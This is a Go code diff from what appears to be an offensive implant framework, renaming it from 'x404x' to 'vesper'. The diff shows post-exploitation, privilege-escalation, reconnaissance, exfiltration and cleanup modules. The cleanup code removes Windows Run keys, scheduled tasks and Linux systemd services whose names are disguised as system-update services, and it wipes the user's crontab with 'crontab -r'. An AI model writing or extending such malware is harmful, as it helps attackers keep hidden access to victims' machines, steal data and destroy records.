@@ -13,7 +13,7 @@ import (
 	"path/filepath"
 	"strings"
 
-	"github.com/ruby570bocadito/x404x/pkg/shared/types"
+	"github.com/ruby570bocadito/vesper/pkg/shared/types"
 )
 
 // PostExploitModule implements the full post-exploitation chain.
@@ -21,7 +21,7 @@ type PostExploitModule struct {
 	agent *Agent
 }
 
-func (m *PostExploitModule) Name() string             { return "post_exploit" }
+func (m *PostExploitModule) Name() string                         { return "post_exploit" }
 func (m *PostExploitModule) KillChainPhase() types.KillChainPhase { return types.PhaseExploitation }
 
 func (m *PostExploitModule) Execute(ctx context.Context, params map[string]string) (string, error) {
@@ -42,7 +42,7 @@ type PrivescScanModule struct {
 	agent *Agent
 }
 
-func (m *PrivescScanModule) Name() string             { return "privesc_scan" }
+func (m *PrivescScanModule) Name() string                         { return "privesc_scan" }
 func (m *PrivescScanModule) KillChainPhase() types.KillChainPhase { return types.PhaseExploitation }
 
 func (m *PrivescScanModule) Execute(ctx context.Context, params map[string]string) (string, error) {
@@ -69,7 +69,7 @@ type ReconModule struct {
 	agent *Agent
 }
 
-func (m *ReconModule) Name() string              { return "recon_basic" }
+func (m *ReconModule) Name() string                         { return "recon_basic" }
 func (m *ReconModule) KillChainPhase() types.KillChainPhase { return types.PhaseRecon }
 
 func (m *ReconModule) Execute(ctx context.Context, params map[string]string) (string, error) {
@@ -104,7 +104,7 @@ type CleanupModule struct {
 	agent *Agent
 }
 
-func (m *CleanupModule) Name() string              { return "cleanup" }
+func (m *CleanupModule) Name() string                         { return "cleanup" }
 func (m *CleanupModule) KillChainPhase() types.KillChainPhase { return types.PhaseActionsOnObjective }
 
 func (m *CleanupModule) Execute(ctx context.Context, params map[string]string) (string, error) {
@@ -124,15 +124,16 @@ func directCleanup() int {
 	cleaned := 0
 	if os.Getenv("OS") != "" || os.PathSeparator == '\\' {
 		// Windows: remove registry Run keys
-		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x_sysupd", "/f").Run()
-		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x_wd", "/f").Run()
-		exec.Command("schtasks", "/delete", "/tn", "x404x_SecurityUpdate", "/f").Run()
-		exec.Command("schtasks", "/delete", "/tn", "x404x_SystemCheck", "/f").Run()
+		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_sysupd", "/f").Run()
+		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_wd", "/f").Run()
+		exec.Command("schtasks", "/delete", "/tn", "vesper_SecurityUpdate", "/f").Run()
+		exec.Command("schtasks", "/delete", "/tn", "vesper_SystemCheck", "/f").Run()
 		cleaned += 4
 	} else {
 		// Linux: remove cron, systemd, autostart, shell profiles
-		exec.Command("crontab", "-r").Run(); cleaned++
-		for _, svc := range []string{"x404x-cored", "system-update-check", "dbus-monitor-d"} {
+		exec.Command("crontab", "-r").Run()
+		cleaned++
+		for _, svc := range []string{"vesper-cored", "system-update-check", "dbus-monitor-d"} {
 			os.Remove("/etc/systemd/system/" + svc + ".service")
 			os.Remove(os.Getenv("HOME") + "/.config/systemd/user/" + svc + ".service")
 			cleaned++
@@ -144,7 +145,7 @@ func directCleanup() int {
 		exec.Command("systemctl", "--user", "daemon-reload").Run()
 	}
 
-	// Delete .x404x files
+	// Delete .vesper files
 	roots := []string{os.TempDir(), "/var/tmp", "/tmp"}
 	if home, _ := os.UserHomeDir(); home != "" {
 		roots = append(roots, home)
@@ -154,7 +155,7 @@ func directCleanup() int {
 			if err != nil {
 				return nil
 			}
-			if strings.HasSuffix(info.Name(), ".x404x") || strings.HasSuffix(info.Name(), ".x404x_key") {
+			if strings.HasSuffix(info.Name(), ".vesper") || strings.HasSuffix(info.Name(), ".vesper_key") {
 				os.Remove(path)
 				cleaned++
 			}
@@ -170,7 +171,7 @@ type ExfilModule struct {
 	agent *Agent
 }
 
-func (m *ExfilModule) Name() string              { return "exfil" }
+func (m *ExfilModule) Name() string                         { return "exfil" }
 func (m *ExfilModule) KillChainPhase() types.KillChainPhase { return types.PhaseExfiltration }
 
 func (m *ExfilModule) Execute(ctx context.Context, params map[string]string) (string, error) {
@@ -191,4 +192,4 @@ func (m *ExfilModule) Execute(ctx context.Context, params map[string]string) (st
 		result.Filename, result.TotalSize, result.Chunks, result.Status, result.ElapsedMs), nil
 }
 func (m *PrivescScanModule) Description() string { return "Privilege escalation scanner" }
-func (m *ReconModule) Description() string { return "Network reconnaissance module" }
+func (m *ReconModule) Description() string       { return "Network reconnaissance module" }
